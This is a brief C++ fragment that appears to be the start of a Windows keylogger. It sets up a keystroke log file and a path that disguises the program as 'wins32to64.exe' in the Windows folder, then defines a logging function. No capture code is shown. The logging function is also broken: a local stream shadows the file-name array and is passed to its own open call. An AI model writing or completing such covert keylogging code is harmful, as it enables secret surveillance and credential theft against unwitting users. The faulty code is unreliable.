#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Advapi32.lib")

using namespace std;

char logfile[] = "log.txt";
char oldfile[] = "key.exe";
char newfile[] = "C:\\Windows\\wins32to64.exe";

void LOG(string input) {
    fstream logfile;
    logfile.open(logfile, fstream::app);
    if (logfile.is_open()) {
        logfile << input;
        logfile.close();
    }
}

